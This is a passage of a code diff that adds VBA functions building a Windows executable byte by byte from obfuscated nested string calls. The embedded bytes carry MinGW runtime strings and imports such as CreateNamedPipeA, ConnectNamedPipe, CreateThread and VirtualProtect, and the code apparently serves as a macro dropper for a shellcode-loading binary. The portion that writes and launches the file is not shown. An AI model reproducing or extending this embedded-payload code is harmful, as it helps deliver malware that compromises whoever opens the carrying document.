+    strPE = B(A(A(B(A(B(strPE, "OMAIN)"), 0), "Argument singularity (SIGN)"), 0), 0), "Overflow range")
+    strPE = B(A(B(strPE, " error (OVERFLOW)"), 0), "The result is too small to be re")
+    strPE = B(A(A(A(B(strPE, "presented (UNDERFLOW)"), 0), 0), 0), "Total loss of significance")
+    strPE = A(A(A(A(B(A(A(B(strPE, " (TLOSS)"), 0), 0), "Partial loss of significance (PLOSS)"), 0), 0), 0), 0)
+    strPE = B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(strPE, 160), "@@"), 0), 191), "@@"), 0), 220), "@@"), 0), 252), "@@"), 0), "4A@"), 0), "XA@"), 0), "Mingw-w64 runtime failure:")
+    strPE = B(A(B(A(A(strPE, 10), 0), "Address %p has no image-section"), 0), "  VirtualQuery f")
+    strPE = B(A(A(A(A(B(strPE, "ailed for %d bytes at address %p"), 0), 0), 0), 0), "  VirtualProte")
+    strPE = B(A(A(B(strPE, "ct failed with code 0x%x"), 0), 0), "  Unknown pseudo relocat")
+
+    PE3 = strPE
+End Function
+
+Private Function PE4() As String
+   Dim strPE As String
+
+    strPE = ""
+    strPE = B(A(A(A(A(B(strPE, "ion protocol version %d."), 10), 0), 0), 0), "  Unknown pseudo reloc")
+    strPE = B(A(A(A(A(B(strPE, "ation bit size %d."), 10), 0), 0), 0), "GCC: (GNU) 7.3-win32 2018050")
+    strPE = B(A(A(A(B(A(A(A(B(strPE, "6"), 0), 0), 0), "GCC: (GNU) 8.3-win32 20190709"), 0), 0), 0), "GCC: (GNU) 8.3")
+    strPE = A(A(A(B(A(A(A(B(strPE, "-win32 20190709"), 0), 0), 0), "GCC: (GNU) 8.3-win32 20190709"), 0), 0), 0)
+    strPE = B(A(A(A(B(strPE, "GCC: (GNU) 8.3-win32 20190709"), 0), 0), 0), "GCC: (GNU) 7.3-win")
+    strPE = B(A(A(A(B(A(A(A(B(strPE, "32 20180506"), 0), 0), 0), "GCC: (GNU) 7.3-win32 20180506"), 0), 0), 0), "GCC:")
+    strPE = B(A(A(A(B(strPE, " (GNU) 7.3-win32 20180506"), 0), 0), 0), "GCC: (GNU) 7.3-win32 2")
+    strPE = B(A(A(A(B(A(A(A(B(strPE, "0180506"), 0), 0), 0), "GCC: (GNU) 7.3-win32 20180506"), 0), 0), 0), "GCC: (GN")
+    strPE = B(A(A(A(B(strPE, "U) 7.3-win32 20180506"), 0), 0), 0), "GCC: (GNU) 7.3-win32 20180")
+    strPE = B(A(A(A(B(A(A(A(B(strPE, "506"), 0), 0), 0), "GCC: (GNU) 7.3-win32 20180506"), 0), 0), 0), "GCC: (GNU) 7")
+    strPE = A(B(A(A(A(B(strPE, ".3-win32 20180506"), 0), 0), 0), "GCC: (GNU) 7.3-win32 20180506"), 0)
+    strPE = B(A(A(A(B(A(A(strPE, 0), 0), "GCC: (GNU) 7.3-win32 20180506"), 0), 0), 0), "GCC: (GNU) 7.3-w")
+    strPE = B(A(A(A(B(A(A(A(B(strPE, "in32 20180506"), 0), 0), 0), "GCC: (GNU) 7.3-win32 20180506"), 0), 0), 0), "GC")
+    strPE = B(A(A(A(B(strPE, "C: (GNU) 7.3-win32 20180506"), 0), 0), 0), "GCC: (GNU) 7.3-win32")
+    strPE = B(A(A(A(B(A(A(A(B(strPE, " 20180506"), 0), 0), 0), "GCC: (GNU) 7.3-win32 20180506"), 0), 0), 0), "GCC: (")
+    strPE = B(A(A(A(B(strPE, "GNU) 7.3-win32 20180506"), 0), 0), 0), "GCC: (GNU) 7.3-win32 201")
+    strPE = B(A(A(A(B(A(A(A(B(strPE, "80506"), 0), 0), 0), "GCC: (GNU) 7.3-win32 20180506"), 0), 0), 0), "GCC: (GNU)")
+    strPE = B(A(A(A(B(strPE, " 8.3-win32 20190709"), 0), 0), 0), "GCC: (GNU) 7.3-win32 2018050")
+    strPE = B(A(A(A(B(A(A(A(B(strPE, "6"), 0), 0), 0), "GCC: (GNU) 7.3-win32 20180506"), 0), 0), 0), "GCC: (GNU) 7.3")
+    strPE = A(A(A(B(A(A(A(B(strPE, "-win32 20180506"), 0), 0), 0), "GCC: (GNU) 8.3-win32 20190709"), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "<`"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 156), "e"), 0), 0), 24), "a"), 0), 0), 176), "`"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 16), "f"), 0), 0)
+    strPE = B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(strPE, 140), "a"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 244), "a"), 0), 0), 2), "b"), 0), 0), 22), "b"), 0), 0), "$b"), 0), 0), "8b"), 0), 0), "Hb"), 0), 0), "`b")
+    strPE = A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(strPE, 0), 0), "xb"), 0), 0), 140), "b"), 0), 0), 162), "b"), 0), 0), 184), "b"), 0), 0), 200), "b"), 0), 0), 218), "b"), 0), 0), 244), "b"), 0), 0), 4), "c"), 0), 0), 16), "c"), 0), 0), 30), "c"), 0), 0), ":c"), 0), 0), "Rc"), 0), 0)
+    strPE = B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(strPE, "lc"), 0), 0), "xc"), 0), 0), 150), "c"), 0), 0), 158), "c"), 0), 0), 178), "c"), 0), 0), 192), "c"), 0), 0), 220), "c"), 0), 0), 238), "c"), 0), 0), 254), "c"), 0), 0), 0), 0), 0), 0), 10), "d"), 0), 0), 26), "d"), 0), 0), "&d")
+    strPE = A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(strPE, 0), 0), "6d"), 0), 0), "Dd"), 0), 0), "Rd"), 0), 0), "dd"), 0), 0), "xd"), 0), 0), 134), "d"), 0), 0), 144), "d"), 0), 0), 156), "d"), 0), 0), 164), "d"), 0), 0), 174), "d"), 0), 0), 182), "d"), 0), 0), 192), "d"), 0), 0)
+    strPE = B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(strPE, 200), "d"), 0), 0), 210), "d"), 0), 0), 218), "d"), 0), 0), 228), "d"), 0), 0), 238), "d"), 0), 0), 248), "d"), 0), 0), 2), "e"), 0), 0), 12), "e"), 0), 0), 22), "e"), 0), 0), " e"), 0), 0), 0), 0), 0), 0), 244), "a"), 0), 0), 2), "b")
+    strPE = A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(strPE, 0), 0), 22), "b"), 0), 0), "$b"), 0), 0), "8b"), 0), 0), "Hb"), 0), 0), "`b"), 0), 0), "xb"), 0), 0), 140), "b"), 0), 0), 162), "b"), 0), 0), 184), "b"), 0), 0), 200), "b"), 0), 0), 218), "b"), 0), 0), 244), "b"), 0), 0)
+    strPE = B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(strPE, 4), "c"), 0), 0), 16), "c"), 0), 0), 30), "c"), 0), 0), ":c"), 0), 0), "Rc"), 0), 0), "lc"), 0), 0), "xc"), 0), 0), 150), "c"), 0), 0), 158), "c"), 0), 0), 178), "c"), 0), 0), 192), "c"), 0), 0), 220), "c"), 0), 0), 238), "c")
+    strPE = A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(strPE, 0), 0), 254), "c"), 0), 0), 0), 0), 0), 0), 10), "d"), 0), 0), 26), "d"), 0), 0), "&d"), 0), 0), "6d"), 0), 0), "Dd"), 0), 0), "Rd"), 0), 0), "dd"), 0), 0), "xd"), 0), 0), 134), "d"), 0), 0), 144), "d"), 0), 0)
+    strPE = B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(strPE, 156), "d"), 0), 0), 164), "d"), 0), 0), 174), "d"), 0), 0), 182), "d"), 0), 0), 192), "d"), 0), 0), 200), "d"), 0), 0), 210), "d"), 0), 0), 218), "d"), 0), 0), 228), "d"), 0), 0), 238), "d"), 0), 0), 248), "d"), 0), 0), 2), "e"), 0), 0), 12), "e")
+    strPE = A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(strPE, 0), 0), 22), "e"), 0), 0), " e"), 0), 0), 0), 0), 0), 0), "T"), 0), "CloseHandle"), 0), "g"), 0), "ConnectNamedPipe"), 0), 0), 140), 0)
+    strPE = A(A(A(A(B(A(A(A(A(B(A(A(A(B(strPE, "CreateFileA"), 0), 164), 0), "CreateNamedPipeA"), 0), 0), 186), 0), "CreateThread"), 0), 0), 215), 0)
+    strPE = B(A(A(A(A(B(A(A(A(B(strPE, "DeleteCriticalSection"), 0), 243), 0), "EnterCriticalSection"), 0), 0), 200), 1), "Ge")
+    strPE = B(A(A(A(B(A(A(A(B(strPE, "tCurrentProcess"), 0), 201), 1), "GetCurrentProcessId"), 0), 205), 1), "GetCurrent")
+    strPE = B(A(A(A(B(A(B(A(A(B(A(A(A(A(B(strPE, "ThreadId"), 0), 0), 7), 2), "GetLastError"), 0), 0), "h"), 2), "GetStartupInfoA"), 0), 127), 2), "GetS")
+    strPE = A(A(A(B(A(A(A(A(B(A(A(A(B(strPE, "ystemTimeAsFileTime"), 0), 155), 2), "GetTickCount"), 0), 0), 212), 2), "HeapAlloc"), 0), 214), 2)
+    strPE = B(A(B(A(B(A(A(A(A(B(strPE, "HeapCreate"), 0), 0), 239), 2), "InitializeCriticalSection"), 0), "E"), 3), "LeaveCri")
+    strPE = B(A(A(A(B(A(A(A(A(B(strPE, "ticalSection"), 0), 0), 182), 3), "QueryPerformanceCounter"), 0), 208), 3), "ReadFile")
+    strPE = B(A(A(A(B(A(A(A(B(A(A(A(A(strPE, 0), 0), 140), 4), "SetUnhandledExceptionFilter"), 0), 153), 4), "Sleep"), 0), 167), 4), "Terminat")
+    strPE = B(A(A(A(B(A(A(A(A(B(strPE, "eProcess"), 0), 0), 174), 4), "TlsGetValue"), 0), 187), 4), "UnhandledExceptionFilter")
+
+    PE4 = strPE
+End Function
+
+Private Function PE5() As String
+   Dim strPE As String
+
+    strPE = ""
+    strPE = A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(strPE, 0), 0), 219), 4), "VirtualProtect"), 0), 0), 222), 4), "VirtualQuery"), 0), 0), 19), 5), "WriteFile"), 0), ";"), 0)
+    strPE = B(A(B(A(A(B(A(B(A(B(A(B(A(B(strPE, "__getmainargs"), 0), "<"), 0), "__initenv"), 0), "E"), 0), "__lconv_init"), 0), 0), "M"), 0), "__p__a")
+    strPE = B(A(B(A(A(B(A(B(A(A(B(A(B(A(B(strPE, "cmdln"), 0), "T"), 0), "__p__fmode"), 0), 0), "i"), 0), "__set_app_type"), 0), 0), "l"), 0), "__setuserm")
+    strPE = B(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(strPE, "atherr"), 0), 0), 143), 0), "_amsg_exit"), 0), 0), 160), 0), "_cexit"), 0), 0), "3"), 1), "_initterm"), 0), "7"), 1), "_iob")
+    strPE = A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(strPE, 0), 0), "<"), 2), "_onexit"), 0), 156), 3), "abort"), 0), 169), 3), "calloc"), 0), 0), 179), 3), "exit"), 0), 0), 195), 3), "fprintf"), 0), 202), 3)
+    strPE = B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(strPE, "free"), 0), 0), 214), 3), "fwrite"), 0), 0), 2), 4), "malloc"), 0), 0), 10), 4), "memcpy"), 0), 0), "%"), 4), "signal"), 0), 0), "("), 4), "sp")
+    strPE = A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(B(strPE, "rintf"), 0), "7"), 4), "strlen"), 0), 0), ":"), 4), "strncmp"), 0), "Y"), 4), "vfprintf"), 0), 0), 0), "`"), 0), 0), 0), "`"), 0), 0), 0), "`"), 0), 0)
+    strPE = B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(strPE, 0), "`"), 0), 0), 0), "`"), 0), 0), 0), "`"), 0), 0), 0), "`"), 0), 0), 0), "`"), 0), 0), 0), "`"), 0), 0), 0), "`"), 0), 0), 0), "`"), 0), 0), 0), "`"), 0), 0), 0), "`"), 0), 0), 0), "`"), 0), 0), 0), "`"), 0), 0), 0), "`")
+    strPE = A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(strPE, 0), 0), 0), "`"), 0), 0), 0), "`"), 0), 0), 0), "`"), 0), 0), 0), "`"), 0), 0), 0), "`"), 0), 0), 0), "`"), 0), 0), 0), "`"), 0), 0), 0), "`"), 0), 0), 0), "`"), 0), 0), 0), "`"), 0), 0), 0), "`"), 0), 0), 0), "`"), 0), 0)
+    strPE = B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(B(strPE, "KERNEL32.dll"), 0), 0), 0), 0), 20), "`"), 0), 0), 20), "`"), 0), 0), 20), "`"), 0), 0), 20), "`"), 0), 0), 20), "`"), 0), 0), 20), "`"), 0), 0), 20), "`"), 0), 0), 20), "`"), 0), 0), 20), "`")
+    strPE = A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(strPE, 0), 0), 20), "`"), 0), 0), 20), "`"), 0), 0), 20), "`"), 0), 0), 20), "`"), 0), 0), 20), "`"), 0), 0), 20), "`"), 0), 0), 20), "`"), 0), 0), 20), "`"), 0), 0), 20), "`"), 0), 0), 20), "`"), 0), 0), 20), "`"), 0), 0), 20), "`"), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(strPE, 20), "`"), 0), 0), 20), "`"), 0), 0), 20), "`"), 0), 0), 20), "`"), 0), 0), "msvcrt.dll"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 16), 17), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 16), 16), "@"), 0), 16), 25), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 192), 26), "@"), 0), "p"), 26)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
